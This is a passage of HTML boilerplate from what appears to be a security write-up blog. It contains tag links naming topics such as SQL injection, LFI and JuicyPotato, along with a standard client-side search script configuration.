href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
